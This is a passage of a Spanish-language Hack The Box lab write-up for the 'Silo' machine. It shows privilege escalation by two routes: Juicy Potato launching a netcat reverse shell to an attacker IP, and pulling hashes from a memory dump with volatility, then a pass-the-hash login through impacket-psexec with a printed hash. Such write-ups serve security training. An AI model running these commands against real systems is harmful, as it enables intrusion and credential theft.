+</code></pre>
+<p><em>Nota: Cabe recalcar que el caracter <code>£</code> puede que no se interprete correctamente si se optó por entablar una reverse shell, causando su omisión y por consiguiente, que a la hora de la descarga indique que la contraseña no es válida. Teniendo que realizar un procesado extra (ejemplo base64) para extraer su contenido. Accediendo al archivo por medio de la webshell no existió este problema</em></p>
+<p><img src="images/post_2.png" alt="Problema de interpretación de caracteres" /></p>
+<h2 id="escalación-de-privilegios"><a class="header" href="#escalación-de-privilegios">Escalación de privilegios</a></h2>
+<h3 id="método-1---juicy-potato"><a class="header" href="#método-1---juicy-potato">Método 1 - Juicy Potato</a></h3>
+<p>Habiendo encontrado los privilegios relacionados con este método de escalación, sólo restaría probar su ejecución mediante el <a href="https://github.com/ohpe/juicy-potato/releases">binario</a> y con las opciones utilizadas para entablar una reverse shell con permisos elevados <code>NT AUTHORITY\SYSTEM</code>. Ejecutando:</p>
+<pre><code class="language-bash">.\jp.exe -t * -l 1337 -p c:\windows\temp\nc.exe -a &quot; -e cmd.exe 10.10.14.16 4321&quot;
+</code></pre>
+<p><img src="images/post_3.png" alt="Ejecución de Juicy Potato" /></p>
+<p>Con lo que respecta a los argumentos utilizados, el binario mismo da la descripción de cada uno de ellos.</p>
+<p><img src="images/post_4.png" alt="Descripción de argumentos" /></p>
+<p>Con lo que respecta a la práctica los argumentos <code>-t</code> y <code>-l</code> no representa algo sustancial el cambiar valores. Y en donde <code>-p</code> (programa a ejecutar) y <code>-a</code> (argumentos a utilizar por el programa señalado) se usaron a partir de las herramientas usadas en pasos anteriores.</p>
+<h3 id="método-2---memdump"><a class="header" href="#método-2---memdump">Método 2 - Memdump</a></h3>
+<p>Con la copia de memoria descargada, se puede hacer uso de <a href="https://www.volatilityfoundation.org/releases">volatility</a> para analizarla. Buscando antes que todo un perfil acorde al perteneciente al dumpeo de memoria, por medio de:</p>
+<pre><code class="language-bash">./volatility_2.6_lin64_standalone -f /home/srrequiem/Documents/htb/windows/medium/silo/content/SILO-20180105-221806.dmp imageinfo
+</code></pre>
+<p>Teniendo en cuenta que debido al acceso previamente obtenido se puede buscar un perfil más adecuado.</p>
+<p><img src="images/post_5.png" alt="Perfiles sugeridos" /></p>
+<p>Ejecutando <code>systeminfo</code> en la máquina se pueden comparar resultados, identificando el perfil <code>Win2012R2x64</code> como el más adecuado.</p>
+<p><img src="images/post_6.png" alt="Información de sistema" /></p>
+<p>Haciendo uso del plugin <code>hashdump</code> se pueden obtener los hashes del sistema, exponiendo de esta manera una forma de acceder a la máquina como el usuario Administrator. Por medio de:</p>
+<pre><code class="language-bash">./volatility_2.6_lin64_standalone -f /home/srrequiem/Documents/htb/windows/medium/silo/content/SILO-20180105-221806.dmp --profile=Win2012R2x64 hashdump
+</code></pre>
+<p><img src="images/post_7.png" alt="Obtención de hashes" /></p>
+<p>Obteniendo acceso haciendo uso del hash con:</p>
+<pre><code class="language-bash">impacket-psexec Administrator@10.10.10.82 -hashes :9e730375b7cbcebf74ae46481e07b0c7
+</code></pre>
+<p><img src="images/post_8.png" alt="Acceso como Administrator" /></p>
+<h1 id="referencias"><a class="header" href="#referencias">Referencias</a></h1>
+<ul>
+<li><a href="https://book.hacktricks.xyz/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener">Hack Tricks - Pentesting Oracle TNS Listener</a>.</li>
+<li><a href="https://github.com/quentinhardy/odat">odat.py</a>.</li>
+<li><a href="https://0xdf.gitlab.io/2018/08/04/htb-silo.html">0xdf Write-up</a>.</li>
+<li><a href="https://www.youtube.com/watch?v=2c7SzNo9uoA">Ippsec Walkthrough</a>.</li>
+<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#juicy-potato-abusing-the-golden-privileges">PayloadAllTheThings - JuicyPotato</a>.</li>
+<li><a href="https://github.com/ohpe/juicy-potato/releases">Binarios Juicy Potato</a>.</li>
+<li><a href="https://www.volatilityfoundation.org/releases">Releases Volatility</a>.</li>
+<li><a href="https://github.com/volatilityfoundation/volatility">Github Volatility</a>.</li>
+</ul>
+
+                    </main>
+
+                    <nav class="nav-wrapper" aria-label="Page navigation">
+                        <!-- Mobile navigation buttons -->
+                            <a rel="prev" href="../../../../../htb/boxes/windows/2_medio/SecNotes/index.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                                <i class="fa fa-angle-left"></i>
+                            </a>
+                            <a rel="next" href="../../../../../htb/boxes/windows/3_dificil/Control/index.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                                <i class="fa fa-angle-right"></i>
+                            </a>
+                        <div style="clear: both"></div>
+                    </nav>
+                </div>
+            </div>
+
+            <nav class="nav-wide-wrapper" aria-label="Page navigation">
+                    <a rel="prev" href="../../../../../htb/boxes/windows/2_medio/SecNotes/index.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                        <i class="fa fa-angle-left"></i>
+                    </a>
+                    <a rel="next" href="../../../../../htb/boxes/windows/3_dificil/Control/index.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                        <i class="fa fa-angle-right"></i>
+                    </a>
+            </nav>
+
+        </div>
+
+        <script type="text/javascript">
+            window.playground_copyable = true;
+        </script>
+        <script src="../../../../../elasticlunr.min.js" type="text/javascript" charset="utf-8"></script>
+        <script src="../../../../../mark.min.js" type="text/javascript" charset="utf-8"></script>
+        <script src="../../../../../searcher.js" type="text/javascript" charset="utf-8"></script>
+        <script src="../../../../../clipboard.min.js" type="text/javascript" charset="utf-8"></script>
+        <script src="../../../../../highlight.js" type="text/javascript" charset="utf-8"></script>
+        <script src="../../../../../book.js" type="text/javascript" charset="utf-8"></script>
+
+        <!-- Custom JS scripts -->
+    </body>
+</html>
